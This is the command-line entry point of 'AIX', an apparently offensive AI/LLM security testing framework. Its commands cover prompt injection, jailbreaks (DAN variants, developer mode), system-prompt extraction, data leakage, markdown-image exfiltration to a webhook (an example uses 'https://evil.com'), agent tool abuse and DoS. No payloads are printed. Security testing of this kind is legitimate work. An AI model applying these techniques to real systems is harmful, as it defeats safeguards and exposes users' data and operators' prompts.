#!/usr/bin/env python3
"""
    ▄▀█ █ ▀▄▀
    █▀█ █ █ █  

    AI eXploit Framework
    The first comprehensive AI/LLM security testing tool
    
    "NetExec for AI" - Test any AI endpoint like a pro
"""

import click
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
import sys
import os

from aix import __version__
from aix.modules import recon, inject, jailbreak, extract, leak, exfil, agent, dos, fuzz, intercept
from aix.db.database import AIXDatabase
from aix.core.request_parser import load_request, RequestParseError

console = Console()

BANNER = """
[bold cyan]    ▄▀█ █ ▀▄▀[/bold cyan]
[bold cyan]    █▀█ █ █ █[/bold cyan]  [dim]v{}[/dim]
    
[dim]    AI Security Testing Framework[/dim]
""".format(__version__)


def print_banner():
    console.print(BANNER)


def _set_proxy_env(proxy: str | None) -> None:
    """Set HTTP(S)_PROXY env vars when proxy is provided.

    Accepts forms like host:port or http://host:port
    """
    if not proxy:
        return
    proxy_url = proxy
    if not proxy_url.startswith('http://') and not proxy_url.startswith('https://'):
        proxy_url = 'http://' + proxy_url
    os.environ['HTTP_PROXY'] = proxy_url
    os.environ['HTTPS_PROXY'] = proxy_url


def validate_input(target, request, param):
    """
    Validate that either target URL or request file is provided.
    Returns (target_url, parsed_request) tuple.
    """
    if not target and not request:
        console.print("[red][-][/red] Error: Either TARGET or --request/-r is required")
        raise click.Abort()

    if target and request:
        console.print("[red][-][/red] Error: Cannot specify both TARGET and --request/-r")
        raise click.Abort()

    parsed_request = None
    if request:
        if not param:
            console.print("[red][-][/red] Error: --param/-p is required when using --request/-r")
            raise click.Abort()
        try:
            parsed_request = load_request(request, param)
            target = parsed_request.url
        except RequestParseError as e:
            console.print(f"[red][-][/red] Error parsing request file: {e}")
            raise click.Abort()

    return target, parsed_request


@click.group(invoke_without_command=True)
@click.option('--version', '-V', is_flag=True, help='Show version')
@click.pass_context
def main(ctx, version):
    """
    AIX - AI eXploit Framework
    
    The first comprehensive AI/LLM security testing tool.
    Test any AI endpoint for vulnerabilities.
    
    \b
    Examples:
        aix recon https://company.com/chatbot
        aix inject https://api.openai.com/v1/chat -k sk-xxx
        aix jailbreak https://chat.company.com --browser
        aix extract --profile company.com
    """
    if version:
        console.print(f"[bold cyan]AIX[/bold cyan] version [green]{__version__}[/green]")
        sys.exit(0)
    
    if ctx.invoked_subcommand is None:
        print_banner()
        console.print(ctx.get_help())


# ============================================================================
# RECON MODULE
# ============================================================================
@main.command()
@click.argument('target', required=False)
@click.option('--request', '-r', help='Request file (Burp Suite format)')
@click.option('--param', '-p', help='Parameter path for injection (e.g., messages[0].content)')
@click.option('--browser', '-b', is_flag=True, help='Use browser for JS-heavy sites')
@click.option('--output', '-o', help='Save profile to file')
@click.option('--timeout', '-t', default=30, help='Request timeout in seconds')
@click.option('--verbose', '-v', is_flag=True, help='Verbose output')
@click.option('--proxy', help='Use HTTP proxy for outbound requests (host:port)')
@click.option('--cookie', '-C', help='Cookies for authentication (key=value; ...)')
@click.option('--headers', '-H', help='Custom headers (key:value; ...)')
@click.option('--format', '-F', type=click.Choice(['json', 'form', 'multipart']), default='json', help='Request body format')
def recon_cmd(target, request, param, browser, output, timeout, verbose, proxy, cookie, headers, format):
    """
    Reconnaissance - Discover AI endpoint details

    \b
    Analyzes target to find:
    - API endpoints and methods
    - Authentication mechanisms
    - Input filters and WAF
    - Model fingerprinting
    - Rate limits

    \b
    Examples:
        aix recon https://company.com/chatbot
        aix recon -r request.txt -p "messages[0].content"
        aix recon https://company.com/chatbot --browser
        aix recon https://api.company.com -o profile.json
    """
    print_banner()
    target, parsed_request = validate_input(target, request, param)
    recon.run(target, browser=browser, output=output, timeout=timeout, verbose=verbose,
              parsed_request=parsed_request, proxy=proxy, cookies=cookie, headers=headers,
              injection_param=param, body_format=format)


# Alias for recon
main.add_command(recon_cmd, name='recon')


# ============================================================================
# INTERCEPT MODULE
# ============================================================================
@main.command()
@click.option('--port', '-p', default=8080, help='Proxy port')
@click.option('--profile', help='Load saved profile')
@click.option('--output', '-o', help='Save intercepted data')
@click.option('--proxy', help='Upstream proxy host:port to forward to (e.g., 127.0.0.1:8080)')
def intercept_cmd(port, profile, output, proxy):
    """
    Intercept - Proxy mode to analyze AI traffic
    
    \b
    Start a proxy to intercept and analyze:
    - Request/response structure
    - Authentication tokens
    - Injection points
    - Hidden parameters
    
    \b
    Examples:
        aix intercept
        aix intercept --port 8888
        aix intercept --profile company.com
    """
    print_banner()
    intercept.run(port=port, profile=profile, output=output, proxy=proxy)


main.add_command(intercept_cmd, name='intercept')


# ============================================================================
# INJECT MODULE
# ============================================================================
@main.command()
@click.argument('target', required=False)
@click.option('--request', '-r', help='Request file (Burp Suite format)')
@click.option('--param', '-p', help='Parameter path for injection (e.g., messages[0].content)')
@click.option('--key', '-k', help='API key for direct API access')
@click.option('--profile', '-P', help='Use saved profile')
@click.option('--targets', '-T', help='File with multiple targets')
@click.option('--browser', '-b', is_flag=True, help='Use browser mode')
@click.option('--evasion', '-e', type=click.Choice(['none', 'light', 'aggressive']), default='light', help='Evasion level')
@click.option('--payloads', help='Custom payloads file')
@click.option('--threads', default=5, help='Number of threads')
@click.option('--verbose', '-v', is_flag=True, help='Verbose output')
@click.option('--output', '-o', help='Output file for results')
@click.option('--proxy', help='Use HTTP proxy for outbound requests (host:port)')
@click.option('--cookie', '-C', help='Cookies for authentication (key=value; ...)')
@click.option('--headers', '-H', help='Custom headers (key:value; ...)')
@click.option('--format', '-F', type=click.Choice(['json', 'form', 'multipart']), default='json', help='Request body format')
def inject_cmd(target, request, param, key, profile, targets, browser, evasion, payloads, threads, verbose, output, proxy, cookie, headers, format):
    """
    Inject - Prompt injection attacks

    \b
    Test for prompt injection vulnerabilities:
    - Direct injection
    - Indirect injection
    - Context manipulation
    - Instruction override

    \b
    Examples:
        aix inject https://api.target.com -k sk-xxx
        aix inject -r request.txt -p "messages[0].content"
        aix inject --profile company.com
        aix inject -T targets.txt --evasion aggressive
    """
    print_banner()
    target, parsed_request = validate_input(target, request, param)
    inject.run(
        target=target, api_key=key, profile=profile, targets_file=targets,
        browser=browser, evasion=evasion, payloads_file=payloads,
        threads=threads, verbose=verbose, output=output,
        parsed_request=parsed_request, proxy=proxy, cookies=cookie, headers=headers,
        injection_param=param, body_format=format
    )


main.add_command(inject_cmd, name='inject')


# ============================================================================
# JAILBREAK MODULE
# ============================================================================
@main.command()
@click.argument('target', required=False)
@click.option('--request', '-r', help='Request file (Burp Suite format)')
@click.option('--param', '-p', help='Parameter path for injection (e.g., messages[0].content)')
@click.option('--key', '-k', help='API key for direct API access')
@click.option('--profile', '-P', help='Use saved profile')
@click.option('--browser', '-b', is_flag=True, help='Use browser mode')
@click.option('--evasion', '-e', type=click.Choice(['none', 'light', 'aggressive']), default='light', help='Evasion level')
@click.option('--test-harmful', is_flag=True, help='Test harmful content generation')
@click.option('--verbose', '-v', is_flag=True, help='Verbose output')
@click.option('--output', '-o', help='Output file for results')
@click.option('--proxy', help='Use HTTP proxy for outbound requests (host:port)')
@click.option('--cookie', '-C', help='Cookies for authentication (key=value; ...)')
@click.option('--headers', '-H', help='Custom headers (key:value; ...)')
@click.option('--format', '-F', type=click.Choice(['json', 'form', 'multipart']), default='json', help='Request body format')
def jailbreak_cmd(target, request, param, key, profile, browser, evasion, test_harmful, verbose, output, proxy, cookie, headers, format):
    """
    Jailbreak - Bypass AI restrictions

    \b
    Test restriction bypass techniques:
    - DAN variants (v1-v15)
    - Character roleplay
    - Developer mode
    - Hypothetical framing

    \b
    Examples:
        aix jailbreak https://chat.target.com --browser
        aix jailbreak -r request.txt -p "messages[0].content"
        aix jailbreak --profile company.com --test-harmful
    """
    print_banner()
    target, parsed_request = validate_input(target, request, param)
    jailbreak.run(
        target=target, api_key=key, profile=profile, browser=browser,
        evasion=evasion, test_harmful=test_harmful, verbose=verbose, output=output,
        parsed_request=parsed_request, proxy=proxy, cookies=cookie, headers=headers,
        injection_param=param, body_format=format
    )


main.add_command(jailbreak_cmd, name='jailbreak')


# ============================================================================
# EXTRACT MODULE
# ============================================================================
@main.command()
@click.argument('target', required=False)
@click.option('--request', '-r', help='Request file (Burp Suite format)')
@click.option('--param', '-p', help='Parameter path for injection (e.g., messages[0].content)')
@click.option('--key', '-k', help='API key for direct API access')
@click.option('--profile', '-P', help='Use saved profile')
@click.option('--browser', '-b', is_flag=True, help='Use browser mode')
@click.option('--verbose', '-v', is_flag=True, help='Verbose output')
@click.option('--output', '-o', help='Output file for results')
@click.option('--proxy', help='Use HTTP proxy for outbound requests (host:port)')
@click.option('--cookie', '-C', help='Cookies for authentication (key=value; ...)')
@click.option('--headers', '-H', help='Custom headers (key:value; ...)')
@click.option('--format', '-F', type=click.Choice(['json', 'form', 'multipart']), default='json', help='Request body format')
def extract_cmd(target, request, param, key, profile, browser, verbose, output, proxy, cookie, headers, format):
    """
    Extract - System prompt extraction

    \b
    Extract hidden system prompts:
    - Direct extraction techniques
    - Roleplay extraction
    - Translation tricks
    - Repeat/format abuse

    \b
    Examples:
        aix extract https://api.target.com -k sk-xxx
        aix extract -r request.txt -p "messages[0].content"
        aix extract --profile company.com
    """
    print_banner()
    target, parsed_request = validate_input(target, request, param)
    extract.run(
        target=target, api_key=key, profile=profile,
        browser=browser, verbose=verbose, output=output,
        parsed_request=parsed_request, proxy=proxy, cookies=cookie, headers=headers,
        injection_param=param, body_format=format
    )


main.add_command(extract_cmd, name='extract')


# ============================================================================
# LEAK MODULE
# ============================================================================
@main.command()
@click.argument('target', required=False)
@click.option('--request', '-r', help='Request file (Burp Suite format)')
@click.option('--param', '-p', help='Parameter path for injection (e.g., messages[0].content)')
@click.option('--key', '-k', help='API key for direct API access')
@click.option('--profile', '-P', help='Use saved profile')
@click.option('--browser', '-b', is_flag=True, help='Use browser mode')
@click.option('--verbose', '-v', is_flag=True, help='Verbose output')
@click.option('--output', '-o', help='Output file for results')
@click.option('--proxy', help='Use HTTP proxy for outbound requests (host:port)')
@click.option('--cookie', '-C', help='Cookies for authentication (key=value; ...)')
@click.option('--headers', '-H', help='Custom headers (key:value; ...)')
@click.option('--format', '-F', type=click.Choice(['json', 'form', 'multipart']), default='json', help='Request body format')
def leak_cmd(target, request, param, key, profile, browser, verbose, output, proxy, cookie, headers, format):
    """
    Leak - Training data extraction

    \b
    Test for data leakage:
    - PII in responses
    - Memorized training data
    - RAG document leakage
    - Model architecture info

    \b
    Examples:
        aix leak https://api.target.com -k sk-xxx
        aix leak -r request.txt -p "messages[0].content"
        aix leak --profile company.com
    """
    print_banner()
    target, parsed_request = validate_input(target, request, param)
    leak.run(
        target=target, api_key=key, profile=profile,
        browser=browser, verbose=verbose, output=output,
        parsed_request=parsed_request, proxy=proxy, cookies=cookie, headers=headers,
        injection_param=param, body_format=format
    )


main.add_command(leak_cmd, name='leak')


# ============================================================================
# EXFIL MODULE
# ============================================================================
@main.command()
@click.argument('target', required=False)
@click.option('--request', '-r', help='Request file (Burp Suite format)')
@click.option('--param', '-p', help='Parameter path for injection (e.g., messages[0].content)')
@click.option('--key', '-k', help='API key for direct API access')
@click.option('--profile', '-P', help='Use saved profile')
@click.option('--webhook', '-w', help='Webhook URL for exfiltration testing')
@click.option('--browser', '-b', is_flag=True, help='Use browser mode')
@click.option('--verbose', '-v', is_flag=True, help='Verbose output')
@click.option('--output', '-o', help='Output file for results')
@click.option('--proxy', help='Use HTTP proxy for outbound requests (host:port)')
@click.option('--cookie', '-C', help='Cookies for authentication (key=value; ...)')
@click.option('--headers', '-H', help='Custom headers (key:value; ...)')
@click.option('--format', '-F', type=click.Choice(['json', 'form', 'multipart']), default='json', help='Request body format')
def exfil_cmd(target, request, param, key, profile, webhook, browser, verbose, output, proxy, cookie, headers, format):
    """
    Exfil - Data exfiltration testing

    \b
    Test data exfiltration channels:
    - Markdown image injection
    - Link injection
    - Hidden iframes
    - Webhook callbacks

    \b
    Examples:
        aix exfil https://api.target.com -k sk-xxx --webhook https://evil.com
        aix exfil -r request.txt -p "messages[0].content"
        aix exfil --profile company.com
    """
    print_banner()
    print_banner()
    target, parsed_request = validate_input(target, request, param)
    exfil.run(
        target=target, api_key=key, profile=profile, webhook=webhook,
        browser=browser, verbose=verbose, output=output,
        parsed_request=parsed_request, proxy=proxy, cookies=cookie, headers=headers,
        injection_param=param, body_format=format
    )


main.add_command(exfil_cmd, name='exfil')


# ============================================================================
# AGENT MODULE
# ============================================================================
@main.command()
@click.argument('target', required=False)
@click.option('--request', '-r', help='Request file (Burp Suite format)')
@click.option('--param', '-p', help='Parameter path for injection (e.g., messages[0].content)')
@click.option('--key', '-k', help='API key for direct API access')
@click.option('--profile', '-P', help='Use saved profile')
@click.option('--browser', '-b', is_flag=True, help='Use browser mode')
@click.option('--verbose', '-v', is_flag=True, help='Verbose output')
@click.option('--output', '-o', help='Output file for results')
@click.option('--proxy', help='Use HTTP proxy for outbound requests (host:port)')
@click.option('--cookie', '-C', help='Cookies for authentication (key=value; ...)')
@click.option('--headers', '-H', help='Custom headers (key:value; ...)')
@click.option('--format', '-F', type=click.Choice(['json', 'form', 'multipart']), default='json', help='Request body format')
def agent_cmd(target, request, param, key, profile, browser, verbose, output, proxy, cookie, headers, format):
    """
    Agent - AI agent exploitation

    \b
    Test AI agent vulnerabilities:
    - Tool abuse
    - Unauthorized actions
    - Privilege escalation
    - Code execution

    \b
    Examples:
        aix agent https://agent.target.com -k sk-xxx
        aix agent -r request.txt -p "messages[0].content"
        aix agent --profile company.com
    """
    print_banner()
    target, parsed_request = validate_input(target, request, param)
    agent.run(
        target=target, api_key=key, profile=profile,
        browser=browser, verbose=verbose, output=output,
        parsed_request=parsed_request, proxy=proxy, cookies=cookie, headers=headers,
        injection_param=param, body_format=format
    )


main.add_command(agent_cmd, name='agent')


# ============================================================================
# DOS MODULE
# ============================================================================
@main.command()
@click.argument('target', required=False)
@click.option('--request', '-r', help='Request file (Burp Suite format)')
@click.option('--param', '-p', help='Parameter path for injection (e.g., messages[0].content)')
@click.option('--key', '-k', help='API key for direct API access')
@click.option('--profile', '-P', help='Use saved profile')
@click.option('--browser', '-b', is_flag=True, help='Use browser mode')
@click.option('--verbose', '-v', is_flag=True, help='Verbose output')
@click.option('--output', '-o', help='Output file for results')
@click.option('--proxy', help='Use HTTP proxy for outbound requests (host:port)')
@click.option('--cookie', '-C', help='Cookies for authentication (key=value; ...)')
@click.option('--headers', '-H', help='Custom headers (key:value; ...)')
@click.option('--format', '-F', type=click.Choice(['json', 'form', 'multipart']), default='json', help='Request body format')
def dos_cmd(target, request, param, key, profile, browser, verbose, output, proxy, cookie, headers, format):
    """
    DoS - Denial of Service testing

    \b
    Test resource exhaustion:
    - Token exhaustion
    - Rate limit testing
    - Infinite loop prompts
    - Memory exhaustion

    \b
    Examples:
        aix dos https://api.target.com -k sk-xxx
        aix dos -r request.txt -p "messages[0].content"
        aix dos --profile company.com
    """
    print_banner()
    target, parsed_request = validate_input(target, request, param)
    dos.run(
        target=target, api_key=key, profile=profile,
        browser=browser, verbose=verbose, output=output,
        parsed_request=parsed_request, proxy=proxy, cookies=cookie, headers=headers,
        injection_param=param, body_format=format
    )


main.add_command(dos_cmd, name='dos')


# ============================================================================
# FUZZ MODULE
# ============================================================================
@main.command()
@click.argument('target', required=False)
@click.option('--request', '-r', help='Request file (Burp Suite format)')
@click.option('--param', '-p', help='Parameter path for injection (e.g., messages[0].content)')
@click.option('--key', '-k', help='API key for direct API access')
@click.option('--profile', '-P', help='Use saved profile')
@click.option('--browser', '-b', is_flag=True, help='Use browser mode')
@click.option('--iterations', '-i', default=100, help='Number of fuzz iterations')
@click.option('--verbose', '-v', is_flag=True, help='Verbose output')
@click.option('--output', '-o', help='Output file for results')
@click.option('--proxy', help='Use HTTP proxy for outbound requests (host:port)')
@click.option('--cookie', '-C', help='Cookies for authentication (key=value; ...)')
@click.option('--headers', '-H', help='Custom headers (key:value; ...)')
@click.option('--format', '-F', type=click.Choice(['json', 'form', 'multipart']), default='json', help='Request body format')
def fuzz_cmd(target, request, param, key, profile, browser, iterations, verbose, output, proxy, cookie, headers, format):
    """
    Fuzz - Fuzzing and edge cases

    \b
    Test edge cases and malformed input:
    - Unicode fuzzing
    - Format string attacks
    - Boundary testing
    - Encoding attacks

    \b
    Examples:
        aix fuzz https://api.target.com -k sk-xxx
        aix fuzz -r request.txt -p "messages[0].content"
        aix fuzz --profile company.com --iterations 500
    """
    print_banner()
    target, parsed_request = validate_input(target, request, param)
    fuzz.run(
        target=target, api_key=key, profile=profile, browser=browser,
        iterations=iterations, verbose=verbose, output=output,
        parsed_request=parsed_request, proxy=proxy, cookies=cookie, headers=headers,
        injection_param=param, body_format=format
    )


main.add_command(fuzz_cmd, name='fuzz')


# ============================================================================
# DATABASE COMMANDS
# ============================================================================
@main.command()
@click.option('--export', '-e', help='Export results to HTML report')
@click.option('--clear', is_flag=True, help='Clear all results')
@click.option('--target', '-t', help='Filter by target')
@click.option('--module', '-m', help='Filter by module')
def db(export, clear, target, module):
    """
    Database - View and manage results
    
    \b
    Examples:
        aix db
        aix db --export report.html
        aix db --target company.com
        aix db --clear
    """
    print_banner()
    
    db = AIXDatabase()
    
    if clear:
        if click.confirm('Are you sure you want to clear all results?'):
            db.clear()
            console.print("[green][+][/green] Database cleared")
        return
    
    if export:
        db.export_html(export, target=target, module=module)
        console.print(f"[green][+][/green] Report exported: {export}")
        return
    
    # Show results
    results = db.get_results(target=target, module=module)
    db.display_results(results)


# ============================================================================
# SCAN ALL COMMAND
# ============================================================================
@main.command()
@click.argument('target', required=False)
@click.option('--request', '-r', help='Request file (Burp Suite format)')
@click.option('--param', '-p', help='Parameter path for injection (e.g., messages[0].content)')
@click.option('--key', '-k', help='API key for direct API access')
@click.option('--profile', '-P', help='Use saved profile')
@click.option('--browser', '-b', is_flag=True, help='Use browser mode')
@click.option('--evasion', '-e', type=click.Choice(['none', 'light', 'aggressive']), default='light', help='Evasion level')
@click.option('--output', '-o', help='Output file for results')
@click.option('--verbose', '-v', is_flag=True, help='Verbose output')
@click.option('--proxy', help='Use HTTP proxy for outbound requests (host:port)')
@click.option('--cookie', '-C', help='Cookies for authentication (key=value; ...)')
@click.option('--headers', '-H', help='Custom headers (key:value; ...)')
@click.option('--format', '-F', type=click.Choice(['json', 'form', 'multipart']), default='json', help='Request body format')
def scan(target, request, param, key, profile, browser, evasion, output, verbose, proxy, cookie, headers, format):
    """
    Scan - Run all modules against target

    \b
    Comprehensive security scan:
    - Recon
    - Inject
    - Jailbreak
    - Extract
    - Leak
    - Exfil

    \b
    Examples:
        aix scan https://api.target.com -k sk-xxx
        aix scan -r request.txt -p "messages[0].content"
        aix scan --profile company.com --evasion aggressive
    """
    print_banner()
    _set_proxy_env(proxy)
    target, parsed_request = validate_input(target, request, param)

    console.print("[bold cyan][*][/bold cyan] Starting comprehensive scan...")
    console.print()

    # Run all modules
    modules_to_run = [
        ('recon', recon),
        ('inject', inject),
        ('jailbreak', jailbreak),
        ('extract', extract),
        ('leak', leak),
        ('exfil', exfil),
    ]

    for name, module in modules_to_run:
        console.print(f"[bold cyan][*][/bold cyan] Running {name} module...")
        try:
            module.run(
                target=target, api_key=key, profile=profile,
                browser=browser, verbose=verbose,
                parsed_request=parsed_request, proxy=proxy, cookies=cookie, headers=headers,
                injection_param=param, body_format=format
            )
        except Exception as e:
            console.print(f"[red][-][/red] {name} failed: {e}")
        console.print()

    console.print("[bold green][+][/bold green] Scan complete!")
    console.print(f"[dim]Run 'aix db --export report.html' to generate report[/dim]")


if __name__ == '__main__':
    main()
